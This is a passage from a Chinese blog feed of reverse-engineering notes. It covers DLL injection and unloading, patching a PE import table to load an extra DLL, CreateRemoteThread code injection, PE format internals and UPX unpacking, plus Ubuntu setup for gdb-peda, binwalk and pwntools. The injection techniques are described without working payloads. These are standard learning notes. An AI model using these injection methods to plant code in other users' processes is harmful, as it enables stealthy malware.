title="DLL卸载"></a>DLL卸载</h3><p>原理是利用FreeLibrary()API，不过仅适用于卸载自己强制注入的DLL文件，PE文件直接导入的DLL文件无法在进程运行过程中卸载</p><h2 id="通过修改PE加载DLL"><a href="#通过修改PE加载DLL" class="headerlink" title="通过修改PE加载DLL"></a>通过修改PE加载DLL</h2><p>修改的关键是找到知道PE文件的格式及组成，了解需要修改的内容</p><h3 id="关于IDT的移动"><a href="#关于IDT的移动" class="headerlink" title="关于IDT的移动"></a>关于IDT的移动</h3><p>新增DLL需要修改文件的IDT（Import Directory Table,导入地址表），若是空间不够，需要找到另外的地方整个移动IDT</p><p>有三种方法：1、查找文件中的空白区域。2、增加文件最后一个节区的大小。3、在文件末尾添加新节区。</p><p>方法一需要注意的是节区在磁盘文件和内存中的大小是不同的，需要计算容量</p><p>IMAGE_OPTIONAL_HEADER的导入表结构体成员用于指出IDT的位置（RVA）及大小，需要增加IID（IMAGE_IMPORT_DESCRIPTOR）结构体大小的字节数，删除绑定导入表（该表为可选项），创建新的IDT并在末尾加入与要导入的dll文件相对应的IID，并设置其指向其他数据结构（INT、Name、IAT）的成员的RVA值，最后更改IAT节区的属性值（加上WRITE属性以便PE装载器正常进行写入操作）</p><h2 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h2><p>代码注入是一种向目标进程插入独立运行代码并使之运行的技术，其一般调用CreateRemoteThread() API以远程线程的形式运行插入的代码，亦称为线程注入。代码以线程过程（ThreadProcedure）形式插入，而代码中使用的数据则以线程参数的形式插入，即代码和数据是分别注入的。</p><p>优点：占用内存少、难以查找痕迹、不需要额外的DLL文件，适用于代码量小且简单的情况。</p><h3 id="使用汇编语言注入"><a href="#使用汇编语言注入" class="headerlink" title="使用汇编语言注入"></a>使用汇编语言注入</h3><p>基本操作是压入参数-调用函数，注意当把字符串放入代码段时，有一个很有意思的call指令用法</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/DLL.png"  alt=""></p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/DLL-2.png"  alt=""></p><p>CALL 002D003F，就把002D0033作为返回地址压入了栈中，同时跳转到“函数“地址2D003F开始执行指令并等待RETN指令，但2D003F其实并不是函数，所以CALL作用仅仅是将紧随其后的字符串地址压入栈，然后再跳转到下一指令</p>]]></content>
      
      
      <categories>
          
          <category> RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE文件整理</title>
      <link href="2020/04/29/PE%E6%96%87%E4%BB%B6%E6%95%B4%E7%90%86/"/>
      <url>2020/04/29/PE%E6%96%87%E4%BB%B6%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="PE相关"><a href="#PE相关" class="headerlink" title="PE相关"></a>PE相关</h1><h2 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h2><p>PE文件是windows下的32位可执行文件格式，64位称为PE+或PE32+</p><p>文件中使用偏移（offset）内存中使用VA（Virtual Address）来表示位置，VA指的是进程虚拟内存中的绝对地址，RVA（Relative Virtual Address）指从某个基准位置（ImageBase）开始的相对地址，RVA+ImageBase=VA</p><h3 id="PE头"><a href="#PE头" class="headerlink" title="PE头"></a>PE头</h3><p>在PE头的最前面有IMAGE_DOS_HEADER结构体，即DOS头，大小为64字节，比较重要的成员是e_magic(DOS签名，4D5A=&gt;ASCII值”MZ”，位于结构体的第一个)，e_lfanew (指示NT头的偏移【根据不同文件拥有可变值】)，使用winhex打开windows自带的notepad文件，结构体情况如下（用notepad.exe文件演示）</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/PE-1.png"  alt=""></p><p>文件开始的2个字节为4D5A，e_lfanew值为0000000E（Intel系列的CPU以逆序存储数据，称为小端序标识法）</p><p>DOS存根在DOS头下方，目的是让程序可以在DOS环境中运行</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/PE-2.png"  alt=""></p><h4 id="NT头"><a href="#NT头" class="headerlink" title="NT头"></a>NT头</h4><p>NT头IMAGE_NT_HEADERS由三个成员组成，大小为F8</p><h5 id="第一个成员：签名（Signature）结构体"><a href="#第一个成员：签名（Signature）结构体" class="headerlink" title="第一个成员：签名（Signature）结构体"></a>第一个成员：签名（Signature）结构体</h5><p>Signature从0xE0开始</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/PE-3.png"  alt=""></p><h5 id="第二个成员：文件头（File-Header"><a href="#第二个成员：文件头（File-Header" class="headerlink" title="第二个成员：文件头（File Header)"></a>第二个成员：文件头（File Header)</h5><p>File Header为表现文件大致属性的文件头，IMAGE_FILE_HEADER结构体，重要成员：</p><p>1、Machine：标识兼容的CPU，本程序中值为0x014C，兼容Intel386</p><p>2、NumberOfSection：用于指出文件中存在的节区数量，该值一定要大于0，且当定于的节区数量与实际节区不同时，将发生运行错误，本程序中值为0x0003</p><p>3、SizeOfOptionalHeader：用于指出最后一个NT头成员的大小，本程序中值为0x00E0</p><p>4、Characteristics：用于标识文件的属性，文件是否是可运行的形态，是否为DLL文件等信息，本程序中值为0x010F</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/PE-4.png"  alt=""></p><h5 id="第三个成员：可选头（Optional-Header）"><a href="#第三个成员：可选头（Optional-Header）" class="headerlink" title="第三个成员：可选头（Optional Header）"></a>第三个成员：可选头（Optional Header）</h5><p>Optional Header为IMAGE_OPTIONAL_HEADER32结构体，重要成员：</p><p>1、Magic：Magic码为0x10B时，为IMAGE_OPTIONAL_HEADER32结构体，Magic码为0x20B时，为IMAGE_OPTIONAL_HEADER64结构体</p><p>2、AddressOfEntryPoint：持有EP的RVA值，指出程序最先执行的代码起始地址</p><p>3、ImageBase：指出文件的优先装入地址，一般情况下EXE文件的ImageBase值为0x00400000，DLL文件为0x10000000，执行PE文件时，PE装载器先创建进程，再将文件载入内存，然后把EIP寄存器的值设置为ImageBase+AddressOfEntryPoint</p><p>4、SectionAlignment, FileAlignment：FileAlignment指定了节区在磁盘文件中的最小单位，SectionAlignment指定了节区在内存中的最小单位。磁盘文件或内存的大小必为FileFlignment或SectionAlignment值的整数倍</p><p>5、SizeOfImage：指定了PE Image在虚拟内存中所占空间的大小</p><p>6、SizeOfHeaders：用来指出整个PE头的大小，该值也必须是FileAlignment的整数倍，第一节区所在位置与SizeOfHeaders距文件开始偏移的量相同</p><p>7、Subsystem：用于区分系统驱动文件（ *.sys）与普通的可执行文件（ *.exe， *.dll），值：1（Drive文件，系统驱动 eg：ntfs.sys）2（GUI文件，窗口应用程序 eg：notepad.exe）3（GUI文件，控制台应用程序 eg：cmd.exe）</p><p>8、NumberOfRvaAndSizes：用于指定DataDirectory（IMAGE_OPTIONAL_HEADER32结构体的最后一个成员）数组的个数</p><p>9、DataDirectory：由IMAGE_DATA_DIRECTORY结构体组成的数组，其中DataDirectory[0]= EXPORT Directory，DataDirectory[1] = IMPORT Directory，DataDirectory[2] = RESOURCE Directory（RVA与Size）</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/PE-5.png"  alt=""></p><h4 id="节区头"><a href="#节区头" class="headerlink" title="节区头"></a>节区头</h4><p>节区头定义了各节区属性，为了保证程序的安全性，PE文件中的code（代码，执行，读取权限）、data（数据，非执行，读写权限）、resource（资源，非执行，读写权限）等按照属性分类存储在不同节区。</p><h5 id="IMAGE-SECTION-HEADER"><a href="#IMAGE-SECTION-HEADER" class="headerlink" title="IMAGE_SECTION_HEADER"></a>IMAGE_SECTION_HEADER</h5><p>节区头是由IMAGE_SECTION_HEADER结构体组成的数组，每个结构体对应一个节区。重要成员：</p><p>1、VirtualSize：内存中节区所占大小</p><p>2、VirtualAddress：内存中节区起始地址（RVA），不含值，由定义在IMAGE_OPTIONAL_HEADER32中的SectionAlignment确定</p><p>3、SizeOfRawData：磁盘文件中节区所占大小</p><p>4、PointerToRawData：磁盘文件中节区起始位置，不含值，由定义在IMAGE_OPTIONAL_HEADER32中的FileAlignment确定</p><p>5、Characteristics：节区属性</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/PE-6.png"  alt=""></p><p>tips：磁盘文件中的PE与内存中的PE有不同形态，将装载到内存中的形态称为“映像（Image）”以示区别</p><h4 id="RVA-to-RAW"><a href="#RVA-to-RAW" class="headerlink" title="RVA to RAW"></a>RVA to RAW</h4><p>RVA指内存地址，RAW指文件偏移</p><p>RAW - PointerToRawData = RVA - VirtualAddress</p><p>RAW = RVA - VirtualAddress + PointerToRawData</p><p>本程序中</p><p>PointerToRawData = 0x00000400</p><p>VirtualAddress = 0x00001000</p><h4 id="IAT"><a href="#IAT" class="headerlink" title="IAT"></a>IAT</h4><p>IAT即Import Address Table，导入地址表，是一种表格，用来记录程序正在使用哪些库中哪些函数。（Table即指数组）</p><h5 id="DLL"><a href="#DLL" class="headerlink" title="DLL"></a>DLL</h5><p>DLL即Dynamic Link Librart，动态链接库，好处：</p><p>1、不需要把库包含到程序中，单独组成DLL文件，需要时调用即可</p><p>2、内存映射技术使加载后的DLL代码、资源在多个进程中实现共享</p><p>3、更新库时只要替换相关DLL文件即可</p><p>加载DLL的方式实际有“显式链接（Explicit Linking）”和“隐式链接（Implicit Linking）”</p><h5 id="IMAGE-IMPORT-DESCRIPTOR"><a href="#IMAGE-IMPORT-DESCRIPTOR" class="headerlink" title="IMAGE_IMPORT_DESCRIPTOR"></a>IMAGE_IMPORT_DESCRIPTOR</h5><p>IMAGE_IMPORT_DESCRIPTOR结构体中记录着文件要导入哪些库文件。</p><p>Import：导入，向库提供服务（函数）</p><p>Export：导出，从库向其他PE文件提供服务（函数）</p><p>导入多少个库就存多少个IMAGE_IMPORT_DESCRIPTOR结构体，这些结构体构成了数组，最后以NULL结构体结束。INT与IAT都是长整型数组。</p><p>IMAGE_IMPORT_DESCRIPTOR结构体数组也被称为IMPORT Directory Table</p><p>重要成员：</p><p>1、OriginalFirstThunk：INT（Tmport Name Table）的地址（RVA）</p><p>2、Name：库名称字符串的地址（RVA）</p><p>3、FirstThunk：IAT的地址（RVA）</p><p>PE装载器将导入函数输入至IAT的顺序：</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/PE-7.png"  alt=""></p><h5 id="在notepad-exe中"><a href="#在notepad-exe中" class="headerlink" title="在notepad.exe中"></a>在notepad.exe中</h5><p>使用RVA to RAW可得文件偏移为6A04（7604-1000+400）</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/PE-8.png"  alt=""></p><p>红框即为第一个元素</p><p>1、库名称（Name）</p><p>在文件中6EAC可得（RVA:7AAC -&gt; RAW:6EAC）库名称comdlg32.dll</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/PE-9.png"  alt=""></p><p>2、OriginalFirstThunk-INT</p><p>RVA：7990 -&gt; RAW：6D90</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/PE-10.png"  alt=""></p><p>3、IMAGE_IMPORT_BY_NAME</p><p>RVA：7A7A -&gt; RAW：6E7A</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/PE-11.png"  alt=""></p><p>最初的两个字节值000F为Ordinal，是库中函数的固有编号，函数名称为PageSetupDlgW，最后以00结尾</p><p>4、FirstThunk-IAT</p><p>RVA：12C4-&gt; RAW：06C4</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/PE-12.png"  alt=""></p><p>由结构体指针数组组成，NULL结尾，第一个元素被硬编码成76324906，没有实际意义，当exe文件加载到内存时，准确的地址值会取代该值。</p><h4 id="EAT"><a href="#EAT" class="headerlink" title="EAT"></a>EAT</h4><p>Windows操作系统中，“库”是为了方便其他程序调用而集中包含相关函数的文件（DLL/SYS）。Win32 API是最具代表性的库，其中的kernel32.dll文件被称为最核心的库文件。</p><p>EAT是一种核心机制，它使不同的应用程序可以调用库文件中提供的函数，PE文件中的特定结构体（IMAGE_EXPORT_DIRECTORY）保存着导出信息，且PE文件中仅有一个用来说明EAT的IMAGE_EXPORT_DIRECTORY结构体</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/PE-13.png"  alt=""></p><p>如图为kernel32.dll文件的IMAGE_OPTIONAL_HEADER32.DataDirectory[0]，可得RVA=262C，所以RAW为1A2C</p><h5 id="IMAGE-EXPORT-DIRECTORY结构体"><a href="#IMAGE-EXPORT-DIRECTORY结构体" class="headerlink" title="IMAGE_EXPORT_DIRECTORY结构体"></a>IMAGE_EXPORT_DIRECTORY结构体</h5><p>重要成员：</p><p>1、NumberOfFunctions：实际Export函数的个数</p><p>2、NumberOfNames：Export函数中具名的函数个数</p><p>3、AddressOfFunctions：Export函数地址数组（数组元素个数=NumberOfFunctions）</p><p>4、AddressOfNames：函数名称地址数组（数组元素个数=NumberOfNames）</p><p>5、AddressOfNameOrdinals：Ordinal地址数组（数组元素个数=NumberOfNames）</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/PE-14.png"  alt=""></p><h5 id="在kernel32-dll中"><a href="#在kernel32-dll中" class="headerlink" title="在kernel32.dll中"></a>在kernel32.dll中</h5><p>1、函数名称数组</p><p>AddressOfNames成员的值为RVA = 3538，即RAW = 2938，在Winhex中</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/PE-15.png"  alt=""></p><p>数组元素个数为NumberOfNames = 3B9</p><p>2、查找指定函数名称</p><p>要查找的函数名称字符串为“AddAtomW”，只需要找到RVA数组中第三个元素的值即可（RVA：4BB3 -&gt; RAW：3FB3）</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/PE-16.png"  alt=""></p><p>3、Ordinal数组</p><p>下面查找“AddAtomW”函数的Ordinal值。AddressOfNameOrdinals成员的值为RVA：441C -&gt; 381C，ordinal数组中的各元素大小为2个字节</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/PE-17.png"  alt=""></p><p>4、ordinal</p><p>将2中求得得index值（2）应用到3中的Ordinal数组即可求得Ordinal（2）。</p><p>AddressOfNameOrdibals[index] = ordinal (index=2, ordinal=2)</p><p>5、函数地址数组-EAT</p><p>最后查找AddAtomW的实际函数地址，AddressOfFunctions成员的值为RVA：2654 -&gt; RAW：1A54</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/PE-18.png"  alt=""></p><p>如图为4字节函数地址RVA数组</p><p>6、AddAtomW函数地址</p><p>用4中求得的Ordinal用作索引，可得RVA = 000326D9</p><p>AddressOfFunctions[ordinal] = RVA (ordinal=2, RVA=326D9)</p><p>Kernel32.dll的ImageBase = 7C800000，因此AddAtomW函数的实际地址（VA）为7C8326D9，用OD验证得</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/PE-19.png"  alt=""></p><h2 id="PE文件压缩相关"><a href="#PE文件压缩相关" class="headerlink" title="PE文件压缩相关"></a>PE文件压缩相关</h2><p>无论哪种形态的文件都是由二进制组成的，经过压缩的文件若能100%恢复，则称为无损压缩（Lossless Data Compression），如ZIP，RAR；若不能恢复原状，则称为有损压缩（Loss Data Compression），如jpg，mp3，mp4。</p><h3 id="运行时压缩器"><a href="#运行时压缩器" class="headerlink" title="运行时压缩器"></a>运行时压缩器</h3><p>运行时压缩器是PE文件的专用压缩器<img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/PE-20.png"  alt=""></p><p>把普通PE文件创建成运行时压缩文件的实用程序称为压缩器（Packer），经反逆向（Anti-Reversing）技术特别处理的压缩器称为保护器</p><h4 id="压缩器"><a href="#压缩器" class="headerlink" title="压缩器"></a>压缩器</h4><p>目的是缩减PE文件大小和隐藏PE文件内部代码与资源，大致分为单纯压缩PE文件的压缩器如UPX，ASPACK，和对源文件进行较大变形，严重破坏PE头，常用于恶意程序的压缩器如UPack，PESpin等。</p><h4 id="保护器"><a href="#保护器" class="headerlink" title="保护器"></a>保护器</h4><p>目的是防止破解，保护代码与资源，常用于保护游戏等的安全程序</p><h4 id="调试UPX压缩的notepad程序"><a href="#调试UPX压缩的notepad程序" class="headerlink" title="调试UPX压缩的notepad程序"></a>调试UPX压缩的notepad程序</h4><p>整个解压缩过程由无数循环组成，注意遇到循环（Loop）时，先了解作用再跳出。</p><p>可以利用Ctrl+F8的自动步过来找到循环（按F7即可停止），然后利用F2+F9的方法跳过循环</p><h5 id="快速查找UPX-OEP的方法"><a href="#快速查找UPX-OEP的方法" class="headerlink" title="快速查找UPX OEP的方法"></a>快速查找UPX OEP的方法</h5><p>1、UPX的特征之一是其EP代码包含在PUSHAD/POPAD指令之间，跳转到OEP代码的JMP指令紧接着出现在POPAD指令之后，所以在JMP指令处设置好断点即可找到OEP</p><p>2、硬件断点</p><h2 id="基址重定位表"><a href="#基址重定位表" class="headerlink" title="基址重定位表"></a>基址重定位表</h2><p>PE文件在重定位过程中会用到基址重定位表（Base Relocation Table）</p><h3 id="PE重定位"><a href="#PE重定位" class="headerlink" title="PE重定位"></a>PE重定位</h3><p>向进程的虚拟内存加载PE文件时，文件会被加载到PE头的ImageBase所指的地址处，若加载的事DLL（SYS）文件，且在ImageBase位置处已经加载了其他DLL（SYS）文件，那么PE装载器就会将其加载到其他未被占用的空间，被加载到其他地址时发生的一系列的处理行为就叫做PE重定位。</p><p>tips：用SDK或VC创建PE文件时，EXE默认ImageBase为00400000，DLL默认ImageBase为10000000，用DDK创建的SYS文件默认的ImageBase为10000。</p><h3 id="PE重定位时执行的操作"><a href="#PE重定位时执行的操作" class="headerlink" title="PE重定位时执行的操作"></a>PE重定位时执行的操作</h3><p>在Windows7的ASLR机制作用下，程序每次加载到内存中的基址都不同，使硬编码在程序中的内存地址随当前加载地址变化而改变的处理过程就是PE重定位。</p><p>无法加载到ImageBase地址时，若未经过PE重定位，应用程序就不能正常运行（因发生“内存地址引用错误”，程序异常终止）</p><h3 id="PE重定位操作原理"><a href="#PE重定位操作原理" class="headerlink" title="PE重定位操作原理"></a>PE重定位操作原理</h3><p>基本操作原理</p><p>1、在应用程序中查找硬编码的地址位置</p><p>2、读取值后，减去ImageBase（VA-&gt;RVA）</p><p>3、加上实际加载地址（RVA-&gt;VA）</p><p>最关键的是查找硬编码地址的位置，过程中会用到PE文件内部的Relocation Table（重定位表），它是记录硬编码地址偏移（位置）的列表（重定位表是在PE文件构建过程（编译/链接）中提供的）。</p><p>基址重定位表位于PE头的DataDirectory数组的第六个元素。</p><p>IMAGE_NT_HEADERS\IMAGE_OPTIONAL_HEADER\IMAGE_DATA_DIRECTORT[5]<img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/PE-21.png"  alt=""></p><p>基址重定位表是IMAGE_BASE_RELOCATION结构体数组，第一个成员为VirtualAddress，是一个基准地址，实际是RVA值。第二个成员为SizeOfBlock，指重定位块的大小。最后一项TypeOffset数组并不是结构体成员，而是以注释形式存在的，表示该结构体之下会出现WORD类型的数组，并且该数组元素的值就是硬编码在程序中的地址偏移。</p><p>TypeOffset成员高四位用作Type，PE文件中常用的值为3（IMAGE_REL_BASED_HIGHLOW），64位的PE+文件中常见值为A（IMAGE_REL_BASED_DIR64）。</p><p>低十二位是真正的位移，该值是基于Virtual Address的偏移，所以程序中硬编码地址的偏移换算等式为：    Virtual Address + Offset = RVA</p>]]></content>
      
      
      <categories>
          
          <category> RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装ubuntu16虚拟机/工具的各种操作备忘录</title>
      <link href="2020/04/22/%E5%AE%89%E8%A3%85ubuntu16%E8%99%9A%E6%8B%9F%E6%9C%BA:%E5%B7%A5%E5%85%B7%E7%9A%84%E5%90%84%E7%A7%8D%E6%93%8D%E4%BD%9C%E5%A4%87%E5%BF%98%E5%BD%95/"/>
      <url>2020/04/22/%E5%AE%89%E8%A3%85ubuntu16%E8%99%9A%E6%8B%9F%E6%9C%BA:%E5%B7%A5%E5%85%B7%E7%9A%84%E5%90%84%E7%A7%8D%E6%93%8D%E4%BD%9C%E5%A4%87%E5%BF%98%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>最近发现当初整的虚拟机有点小了，回想起之前分区的惨痛经历，索性两眼一闭整个新的</p><p>顺便记录一下各种工具和安装，方便日后查询（说不定还有重装的时候…</p><h1 id="虚拟机的安装"><a href="#虚拟机的安装" class="headerlink" title="虚拟机的安装"></a>虚拟机的安装</h1><p>在网上整个ios镜像下载就行</p><p>中科大源：<a href="http://mirrors.ustc.edu.cn/ubuntu-releases/16.04/" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/ubuntu-releases/16.04/</a></p><p>分配的硬盘大小调到50g就直接默认安装</p><p>安装后可能出现没有网络的问题，解决方案是打开网络开关，不行的话移除网络适配器再重新添加即可</p><h2 id="初始工作"><a href="#初始工作" class="headerlink" title="初始工作"></a>初始工作</h2><h3 id="最基本的工具"><a href="#最基本的工具" class="headerlink" title="最基本的工具"></a>最基本的工具</h3><p>先行安装：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install python-pip</span><br><span class="line">$ sudo apt install vim</span><br><span class="line">$ sudo apt install git</span><br></pre></td></tr></table></figure><h3 id="更换pip源"><a href="#更换pip源" class="headerlink" title="更换pip源"></a>更换pip源</h3><p>更换pip源为阿里云</p><p>修改 ~/.pip/pip.conf (没有就创建一个)， 内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[<span class="keyword">global</span>]</span><br><span class="line">timeout = <span class="number">10</span></span><br><span class="line">index-url = http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line">[install]</span><br><span class="line">trusted-host=</span><br><span class="line">    mirrors.aliyun.com</span><br></pre></td></tr></table></figure><h3 id="更换默认的python3-5为python3-7"><a href="#更换默认的python3-5为python3-7" class="headerlink" title="更换默认的python3.5为python3.7"></a>更换默认的python3.5为python3.7</h3><p>1、配置依赖环境</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install zlib1g-dev libbz2-dev libssl-dev libncurses5-dev libsqlite3-dev </span><br><span class="line">libreadline-dev tk-dev libgdbm-dev libdb-dev libpcap-dev xz-utils libexpat1-dev </span><br><span class="line">liblzma-dev libffi-dev libc6-dev</span><br></pre></td></tr></table></figure><p>2、按这里面的来</p><p><a href="https://blog.csdn.net/qq_29837161/article/details/83616364" target="_blank" rel="noopener">https://blog.csdn.net/qq_29837161/article/details/83616364</a></p><p>但是一定要注意创建python3和pip3的软链接（主要是为了方便）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ln -s /opt/python3<span class="number">.7</span>/bin/python3<span class="number">.7</span> /usr/bin/python3</span><br><span class="line">$ sudo ln -s /opt/python3<span class="number">.7</span>/bin/pip3 /usr/bin/pip3</span><br></pre></td></tr></table></figure><p>然后会出现无法打开终端的问题</p><p>原因是没有<code>_gi</code>这个库，然后你把原来系统中的库改个名就可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cd /usr/lib/python3/dist-packages/gi/</span><br><span class="line"><span class="comment"># 下面的35 改成37 表示从py3.5 改到py3.7，如果安装的是3.6就改成36</span></span><br><span class="line">$ sudo cp _gi_cairo.cpython<span class="number">-35</span>m-x86_64-linux-gnu.so  _gi_cairo.cpython<span class="number">-37</span>m-x86_64-linux-gnu.so</span><br><span class="line">$ sudo cp _gi.cpython<span class="number">-35</span>m-x86_64-linux-gnu.so _gi.cpython<span class="number">-37</span>m-x86_64-linux-gnu.so</span><br><span class="line">$ cp -r /usr/lib/python3/dist-packages/gi /opt/python3<span class="number">.7</span>/lib/python3<span class="number">.7</span>/site-packages/</span><br></pre></td></tr></table></figure><p>如果不慎把终端关了，可以在文件里面用右键打开</p><h1 id="工具的安装"><a href="#工具的安装" class="headerlink" title="工具的安装"></a>工具的安装</h1><h2 id="gdb-peda"><a href="#gdb-peda" class="headerlink" title="gdb-peda"></a>gdb-peda</h2><p>这是我想起来的第一个工具，用于在终端动调程序，安装方式也简单，没出什么幺蛾子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">$ echo <span class="string">"source ~/peda/peda.py"</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><h3 id="使用操作"><a href="#使用操作" class="headerlink" title="使用操作"></a>使用操作</h3><h4 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h4><ol><li>start 开始调试</li><li>run 从头开始运行到断点</li><li>next 执行下一行语句，不进入到函数中（n 10指执行10行），按回车是执行上一次的命令</li><li>quit 退出程序</li></ol><h4 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h4><ol><li>b N-LINE 在第n行设置断点</li><li>b fnc 在fnc函数上设置断点</li><li>delete breakpoints 删除断点</li><li>info breakpoints 查看断点列表</li></ol><h4 id="读操作"><a href="#读操作" class="headerlink" title="读操作"></a>读操作</h4><ol><li>读取某个变量的值: p &lt;var&gt; </li><li>读取某个内存地址里的内容: x /NFU &lt;memaddr&gt; </li><li>读取某个寄存器的值: info r &lt;register&gt;</li><li>读取栈上内容: stack(s) 20（读取20行，每25行为一页，按回车进行切换</li></ol><h4 id="写操作"><a href="#写操作" class="headerlink" title="写操作"></a>写操作</h4><ol><li><p>修改某个变量的值： set var &lt;name&gt; = &lt;value&gt;</p></li><li><p>修改某个内存地址的值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">set *(unsigned char      *)&lt;memaddr&gt; &#x3D; &lt;value&gt;  ; write 1 byte</span><br><span class="line">set *(unsigned short     *)&lt;memaddr&gt; &#x3D; &lt;value&gt;  ; write 2 bytes</span><br><span class="line">set *(unsigned int       *)&lt;memaddr&gt; &#x3D; &lt;value&gt;  ; write 4 bytes</span><br><span class="line">set *(unsigned long long *)&lt;memaddr&gt; &#x3D; &lt;value&gt;  ; write 8 bytes</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">set *(char      *)&lt;memaddr&gt; &#x3D; &lt;value&gt;           ; write 1 byte</span><br><span class="line">set *(short     *)&lt;memaddr&gt; &#x3D; &lt;value&gt;           ; write 2 bytes</span><br><span class="line">set *(int       *)&lt;memaddr&gt; &#x3D; &lt;value&gt;           ; write 4 bytes</span><br><span class="line">set *(long long *)&lt;memaddr&gt; &#x3D; &lt;value&gt;           ; write 8 bytes</span><br></pre></td></tr></table></figure></li><li><p>修改某个寄存器的值：set $&lt;register&gt; = &lt;value&gt;</p></li></ol><h2 id="geany"><a href="#geany" class="headerlink" title="geany"></a>geany</h2><p>一个轻量化的编辑器，感觉还挺好用的，PyCharm打开太慢了…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install geany</span><br></pre></td></tr></table></figure><h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2><p>用来分割文件写misc题的小工具</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install binwalk</span><br></pre></td></tr></table></figure><h3 id="使用操作-1"><a href="#使用操作-1" class="headerlink" title="使用操作"></a>使用操作</h3><p>binwalk -e filename</p><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>便于简单快速写EXP的CTF框架和漏洞利用开发库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install -y python-dev python-pip libffi-dev libssl-dev</span><br><span class="line">$ pip install -U setuptools</span><br><span class="line">$ pip install pwntools</span><br></pre></td></tr></table></figure><h3 id="使用操作-2"><a href="#使用操作-2" class="headerlink" title="使用操作"></a>使用操作</h3><p>顺便记录一下pwn的exp模版</p><figure class="highlight python"><table><tr><td 